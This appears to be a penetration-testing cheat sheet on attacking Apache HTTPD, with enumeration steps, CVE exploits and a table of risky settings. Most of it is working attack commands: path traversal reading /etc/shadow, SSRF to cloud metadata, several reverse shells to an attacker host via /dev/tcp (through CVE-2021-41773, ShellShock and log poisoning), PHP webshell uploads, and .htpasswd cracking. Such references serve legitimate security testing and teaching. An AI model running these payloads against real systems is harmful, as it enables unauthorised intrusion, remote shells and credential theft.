# Apache

#Apache #ApacheHTTPD #webserver #webservices #RCE #LFI

## What is Apache HTTPD?
Most widely deployed open-source web server. Highly modular — attack surface varies significantly based on enabled modules (mod_status, mod_cgi, mod_dav, mod_php, mod_proxy, mod_rewrite). Several critical CVEs including unauthenticated path traversal/RCE (2.4.49/50) and the 2024 "confusion attack" class (mod_rewrite/handler/`?`-truncation). Distinct from generic HTTP enumeration — this note covers Apache-specific misconfigs, modules, and vulnerabilities.

- Port: **TCP 80** — HTTP
- Port: **TCP 443** — HTTPS
- Version banner: `Server: Apache/2.4.xx (Ubuntu)`

---

## Tools

| Tool | Use |
|---|---|
| [[Tools/Scanning/NMAP\|nmap]] | Version/OS from banner; NSE `http-server-header`, `http-title`, `ssl-*` fingerprint |
| [[Tools/File Transfer/cURL\|cURL]] | Manual probing — `server-status`/`server-info`, path-traversal & confusion-attack PoCs, `unix:` SSRF, WebDAV `PUT` |
| [[Tools/Scanning/gobuster\|gobuster]] | Content/CGI discovery, `.htaccess`/`.htpasswd` and backup-file hunting |
| [[Tools/Scanning/ffuf\|ffuf]] | `Apache.fuzz.txt` wordlist, PHP-extension bypass fuzzing |
| [[Tools/File Transfer/wget\|wget]] | Recursive spider of an exposed `Options +Indexes` autoindex |
| [[Tools/Payloads & Shells/metasploit\|metasploit]] | `apache_normalize_path_rce` (41773/42013), `apache_mod_cgi_bash_env_exec` (ShellShock) |
| [[Tools/Auth/hashcat\|hashcat]] | Crack `$apr1$` MD5-APR `.htpasswd` hashes (`-m 1600`) |
| [[Tools/Auth/john the ripper\|John]] | Crack `.htpasswd` (APR1/bcrypt/SHA) |
| [[Tools/File Transfer/cadaver\|cadaver]] | Interactive WebDAV client for `mod_dav` upload/move |

---

## Key Config Files

| File | Path (Debian/Ubuntu) | Path (RHEL/CentOS) |
|---|---|---|
| Main config | `/etc/apache2/apache2.conf` | `/etc/httpd/conf/httpd.conf` |
| Enabled sites | `/etc/apache2/sites-enabled/` | `/etc/httpd/conf.d/` |
| Enabled mods | `/etc/apache2/mods-enabled/` | — |
| Per-dir config | `.htaccess` (in web root) | `.htaccess` |
| Default web root | `/var/www/html/` | `/var/www/html/` |
| Access log | `/var/log/apache2/access.log` | `/var/log/httpd/access_log` |
| Error log | `/var/log/apache2/error.log` | `/var/log/httpd/error_log` |

---

## Enumeration

```bash
# Version + OS from banner
curl -I http://<target>/ | grep -i "server:"
nmap -p 80,443 --script http-server-header,http-title,banner -sV <target>

# Detect Apache-specific pages
curl -s http://<target>/server-status    # mod_status
curl -s http://<target>/server-info      # mod_info
curl -s http://<target>/manual/          # Apache manual (reveals version)

# Check modules and config via server-info
curl -s http://<target>/server-info | grep -i "module\|config\|directive"

# Find .htaccess files (if directory listing enabled)
gobuster dir -u http://<target> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt \
  -x .htaccess,.htpasswd,.php,.html,.txt,.bak

# Apache-specific wordlist
ffuf -u http://<target>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/Apache.fuzz.txt
```

### MultiViews / mod_negotiation

`Options +MultiViews` makes Apache content-negotiate: a request for `/foo` returns the best-matching `foo.*` on disk. This leaks the file-variant set and can hand you source.

```bash
# Probe: does the server negotiate? Ask for a base name with no extension.
curl -s http://<target>/index          # returns index.php/index.html silently → MultiViews on

# Force a 406 "Not Acceptable" — Apache lists every available variant of the resource
curl -s -H "Accept: application/xrandom" http://<target>/index
# → 406 body enumerates index.php, index.html, index.php.bak, index.en, ... (real filenames, no guessing)

# Type-map (.var) handler can also enumerate/serve variants
curl -s http://<target>/index.var
```

---

## mod_status (/server-status)

Exposes real-time server activity — running requests, client IPs, URLs being processed. Often reveals internal hostnames, backend URLs, and active sessions.

```bash
# Check if exposed (no auth = misconfiguration)
curl -s http://<target>/server-status
curl -s http://<target>/server-status?auto   # machine-readable format

# What it reveals:
# - Client IPs making requests (internal network mapping)
# - URLs currently being processed (may include tokens, credentials in GET params)
# - Worker states, uptime, request counts
# - Virtual host names

# Extract active requests
curl -s http://<target>/server-status | grep -oP 'GET \S+|POST \S+' | sort -u
curl -s http://<target>/server-status?auto | grep -i "request\|client"
```

---

## mod_info (/server-info)

Full module configuration disclosure — reveals loaded modules, config directives, and compiled-in settings.

```bash
curl -s http://<target>/server-info
curl -s http://<target>/server-info | grep -i "module\|LoadModule\|directive\|config file"

# Reveals:
# - All loaded modules (mod_php, mod_cgi, mod_dav, mod_rewrite, etc.)
# - Per-module config directives
# - File paths of config files
# - PHP configuration (if mod_php loaded)
```

---

## Attack Vectors

### CVE-2021-41773 — Path Traversal + RCE (Apache 2.4.49)

Unauthenticated path traversal and RCE on Apache 2.4.49 when `Require all denied` is NOT set on the filesystem.

```bash
# Path traversal — read arbitrary files
curl -s "http://<target>/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
curl -s "http://<target>/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow"

# RCE (requires mod_cgi enabled)
curl -s -X POST "http://<target>/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh" \
  --data "echo Content-Type: text/plain; echo; id"

# Reverse shell via RCE
curl -s -X POST "http://<target>/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/bash" \
  --data "echo Content-Type: text/plain; echo; bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1"

# Metasploit
use exploit/multi/http/apache_normalize_path_rce
set RHOSTS <target>
set LHOST <attacker_ip>
run
```

### CVE-2021-42013 — Path Traversal (Apache 2.4.50)

Bypass for the 2.4.49 fix — double encoding.

```bash
# Double-encoded traversal
curl -s "http://<target>/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd"

# RCE
curl -s -X POST "http://<target>/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/bin/sh" \
  --data "echo Content-Type: text/plain; echo; id"

# Metasploit (handles both 41773 and 42013)
use exploit/multi/http/apache_normalize_path_rce
set CVE CVE-2021-42013
run
```

### CVE-2021-40438 — mod_proxy SSRF (≤ 2.4.48)

If `mod_proxy` is loaded and a `ProxyPass`/`RewriteRule [P]`/`ProxyPassMatch` maps user input into the proxied URL, a `unix:` prefix followed by a `|` redirects the proxy to an attacker-chosen backend — full SSRF (hit cloud metadata, internal hosts, other vhosts). CISA KEV, used in ransomware.

**Conditions:** Apache ≤ 2.4.48 with mod_proxy enabled and a proxy directive that consumes part of the request path/query.

```bash
# The 'unix:' string must appear before the '|', and the '|' must be a literal
# pipe (unencoded) sitting after the '?' arg separator so it isn't URL-encoded away.
curl -s "http://<target>/?unix:$(python3 -c 'print("A"*5000)')|http://169.254.169.254/latest/meta-data/"

# Reach an internal-only service through the proxy
curl -s "http://<target>/?unix:$(python3 -c 'print("A"*5000)')|http://127.0.0.1:8080/"

# Detection (blue-team): request URIs containing "unix:" ... "|" after "?"
```

The long `A` padding overflows the fixed unix-socket-path buffer so parsing falls through to the attacker URL after the `|`.

### 2024 Confusion Attacks (Orange Tsai, ≤ 2.4.59)

A class of URL/filename **semantic-confusion** bugs — Apache passes `r->filename` between modules that interpret it differently (URL vs filesystem path), and an encoded `?` (`%3F`) truncates or reroutes the resolved path. Patched in **2.4.60**. Several are in CISA KEV. Exact payloads depend on the target's `RewriteRule`s, so treat these as templates and confirm the rewrite behaviour first.

```bash
# CVE-2024-38475 — Filename Confusion: '?' truncates the rewritten filesystem path.
# A RewriteRule like: RewriteRule ^/user/(.+)$ /var/user/$1/profile.yml
# lets '%3F' cut off the intended '/profile.yml' suffix → read a sibling file / source.
curl -s "http://<target>/user/orange%2Fsecret.yml%3F"       # → /var/user/orange/secret.yml

# CVE-2024-38474 — Handler Confusion: encoded '?' mis-applies a [H=...php] RewriteFlag
# to an uploaded non-PHP file → execute a webshell hidden in a GIF/upload.
curl -s "http://<target>/upload/1.gif%3Fooo.php"            # runs 1.gif as PHP

# CVE-2024-38476 — ACL/Auth Bypass: auth module sees 'admin.php?ooo.php' (no match to
# the protected 'admin.php'), but PHP-FPM over mod_proxy normalises and executes it.
curl -s "http://<target>/admin.php%3Fooo.php"

# DocumentRoot Confusion: unsafe rewrite + traversal reaches on-disk 'gadget' scripts
# outside the intended root (e.g. bundled example PHP under /usr/share).
curl -s "http://<target>/html/usr/share/doc/websocketd/examples/php/dump-env.php%3F"

# CVE-2024-39573 — mod_rewrite SSRF where the attacker controls the full RewriteRule prefix.
```

> [!warning] **Version gate.** The confusion set is fixed in httpd **2.4.60** (2024-07-01) — but that release also broke several legitimate configs, so patched-but-reverted or `LegacyRewrite`-style workarounds are common in the wild. Fingerprint the exact build (`Server:` header / `server-status`) before assuming patched.

### CVE-2014-6271 — ShellShock (CGI + Bash)

Bash environment variable injection via HTTP headers. Affects Apache with mod_cgi/mod_cgid running CGI scripts that invoke bash.

```bash
# Check for CGI scripts
gobuster dir -u http://<target>/cgi-bin/ -w /usr/share/seclists/Discovery/Web-Content/CGIs.txt

# Test for ShellShock
curl -H 'User-Agent: () { :; }; echo; echo vulnerable' http://<target>/cgi-bin/test.cgi
curl -H 'Referer: () { :; }; echo; echo vulnerable' http://<target>/cgi-bin/test.sh

# RCE via ShellShock
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1' \
  http://<target>/cgi-bin/test.cgi

# Metasploit
use exploit/multi/http/apache_mod_cgi_bash_env_exec
set RHOSTS <target>
set TARGETURI /cgi-bin/test.cgi
set LHOST <attacker_ip>
run
```

### Directory Listing (Options +Indexes)

```bash
# Enabled directory listing reveals all files
curl -s http://<target>/uploads/
curl -s http://<target>/backup/
curl -s http://<target>/files/

# Recursively spider exposed directories
wget -r -np --no-parent http://<target>/backup/

# Look for backup files, configs, DB dumps
gobuster dir -u http://<target> -w /usr/share/wordlists/dirb/common.txt \
  -x zip,tar,gz,bak,sql,old,conf,config
```

> [!tip] **Recognising an autoindex in crawl output.** Apache emits an index only for a directory with **no `index.*` file**, so a listable dir gives you the exact filename set with zero guessing — but the webroot itself usually *won't* list (it has `index.php`), so root-level files are only found if something links to them (or via source read). The fingerprint of a rendered listing: the column-sort links `?C=N;O=D`, `?C=M;O=A`, `?C=S;O=A`, `?C=D;O=A` (Apache only emits those on a listing) plus references to `/icons/folder.gif`, `/icons/text.gif`, `/icons/back.gif`. Seeing those in extracted links = a real directory listing, not a page.

### Log Poisoning → LFI to RCE

Inject PHP into Apache access log via User-Agent, then include log via LFI.

```bash
# Step 1: Inject PHP into access log
curl -s -A '<?php system($_GET["cmd"]); ?>' http://<target>/

# Step 2: Include log via LFI
curl -s "http://<target>/vuln.php?file=/var/log/apache2/access.log&cmd=id"

# Log paths to try
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/httpd/access_log
/proc/self/fd/2    # stderr (sometimes works too)

# Step 3: Escalate to reverse shell
curl "http://<target>/vuln.php?file=/var/log/apache2/access.log&cmd=bash+-c+'bash+-i+>%26+/dev/tcp/<attacker_ip>/<port>+0>%261'"
```

### .htaccess Abuse

```bash
# If upload directory allows .htaccess upload:
# Override file handler to execute PHP
echo 'AddType application/x-httpd-php .jpg' > .htaccess
# Upload .htaccess → upload shell.jpg → access shell.jpg → RCE

# .htaccess with php_value — disable security settings
echo 'php_value auto_prepend_file /etc/passwd' > .htaccess

# Disable authentication for a directory
echo 'Satisfy Any' > .htaccess

# Enable CGI execution
echo 'Options +ExecCGI' > .htaccess
echo 'AddHandler cgi-script .txt' >> .htaccess
# Upload shell.txt with CGI content
```

### .htpasswd — Credential Extraction

```bash
# .htpasswd stores HTTP basic auth credentials
curl -s http://<target>/.htpasswd
curl -s http://<target>/.htpasswd.bak

# Common locations
find /var/www -name ".htpasswd" 2>/dev/null
cat /var/www/html/.htpasswd

# Hash format: user:$apr1$... (MD5-APR) or user:{SHA}... (SHA1)
# Crack with hashcat
hashcat -m 1600 hashes.txt /usr/share/wordlists/rockyou.txt   # MD5-APR ($apr1$)
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

### PHP Extension / MIME Type Bypass

```bash
# If only .php is blocked but other extensions execute PHP:
# Try: .php3, .php4, .php5, .php7, .phtml, .phar, .phps

for ext in php3 php4 php5 php7 phtml phar; do
  code=$(curl -s -o /dev/null -w "%{http_code}" -X PUT "http://<target>/shell.$ext" -d '<?php system($_GET["cmd"]); ?>')
  echo "$code .${ext}"
done

# Case variation (Windows Apache)
# shell.PHP, shell.Php, shell.PHp

# Null byte (very old PHP versions)
# shell.php%00.jpg
```

**Double extension (`AddHandler`/`mod_mime`).** If the server uses `AddHandler application/x-httpd-php .php` (rather than `SetHandler` inside a `<FilesMatch>`), mod_mime executes **any** file whose name *contains* a `.php` segment — so an upload filter that only checks the last extension is bypassed:

```bash
# shell.php.jpg — passes a ".jpg only" filter, still runs as PHP under AddHandler
curl -X PUT http://<target>/uploads/shell.php.jpg -d '<?php system($_GET["cmd"]); ?>'
curl "http://<target>/uploads/shell.php.jpg?cmd=id"
```

### WebDAV (mod_dav)

```bash
# Check WebDAV enabled
curl -X OPTIONS http://<target>/ -v 2>&1 | grep -i "DAV\|Allow:"

# Upload via WebDAV
curl -X PUT http://<target>/shell.php -d '<?php system($_GET["cmd"]); ?>'
curl -X PUT http://<target>/shell.php --data-binary @shell.php

# cadaver WebDAV client
cadaver http://<target>/
dav:> put shell.php
```

---

## Information Disclosure

```bash
# Default test pages (reveal version, OS)
curl -s http://<target>/index.html   # "Apache2 Ubuntu Default Page"
curl -s http://<target>/            # default page may show version

# Backup / temp files
for f in index.php.bak index.php~ .index.php wp-config.php.bak config.php.bak; do
  echo "$(curl -o /dev/null -sw '%{http_code}' http://<target>/$f) $f"
done

# PHP info disclosure
curl http://<target>/phpinfo.php
curl http://<target>/info.php
curl http://<target>/test.php

# Apache error pages — may include path info
curl http://<target>/nonexistent   # 404 may reveal DocumentRoot path
```

---

## Dangerous Settings

| Setting | Risk |
|---|---|
| `Options +Indexes` | Directory listing → file exposure |
| `mod_status` without IP restriction | Internal IP/request disclosure |
| `mod_info` exposed | Full config + module disclosure |
| `mod_cgi` + ShellShock-era bash | RCE via CGI headers |
| Apache 2.4.49/50 unpatched | Unauthenticated path traversal + RCE |
| Apache ≤ 2.4.59 (mod_rewrite/mod_proxy) | 2024 confusion attacks — source disclosure, ACL bypass, RCE, SSRF |
| `mod_proxy` ≤ 2.4.48 with user-influenced proxy path | `unix:`-prefix SSRF (CVE-2021-40438) |
| `Options +MultiViews` / mod_negotiation | Filename-variant & source disclosure via content negotiation |
| `AddHandler ... .php` (vs `SetHandler` in `<FilesMatch>`) | Double-extension (`x.php.jpg`) upload → PHP execution |
| `.htaccess` override allowed in upload dirs | .htaccess upload → PHP execution |
| `AllowOverride All` in upload directories | .htaccess-based auth bypass / RCE |
| Verbose error pages | Path, config, and version disclosure |
| Log files readable via LFI | Log poisoning → RCE |

---

## Quick Reference

| Goal | Command |
|---|---|
| Version | `curl -I http://host \| grep Server` |
| server-status | `curl -s http://host/server-status` |
| server-info | `curl -s http://host/server-info` |
| CVE-2021-41773 (path traversal) | `curl "http://host/cgi-bin/.%2e/%2e%2e/%2e%2e/etc/passwd"` |
| CVE-2021-41773 RCE (MSF) | `exploit/multi/http/apache_normalize_path_rce` |
| CVE-2021-40438 (mod_proxy SSRF) | `curl "http://host/?unix:$(python3 -c 'print("A"*5000)')\|http://169.254.169.254/"` |
| CVE-2024-38475 (filename confusion) | `curl "http://host/user/x%2Fsecret.yml%3F"` |
| CVE-2024-38476 (ACL bypass) | `curl "http://host/admin.php%3Fooo.php"` |
| MultiViews source leak | `curl -H "Accept: application/xrandom" http://host/index` (406 lists variants) |
| Double-extension exec | `PUT /uploads/shell.php.jpg` then `?cmd=id` |
| ShellShock | `curl -H 'User-Agent: () { :; }; /bin/bash ...' http://host/cgi-bin/x.cgi` |
| Log poison | `curl -A '<?php system($_GET["cmd"]); ?>' http://host/` |
| LFI + log | `?file=/var/log/apache2/access.log&cmd=id` |
| .htpasswd crack | `hashcat -m 1600 hashes.txt rockyou.txt` |
| WebDAV upload | `curl -X PUT http://host/shell.php -d '<?php system($_GET["cmd"]); ?>'` |

---

*Created: 2026-07-13*
*Updated: 2026-09-24*
*Model: claude-opus-4-8*
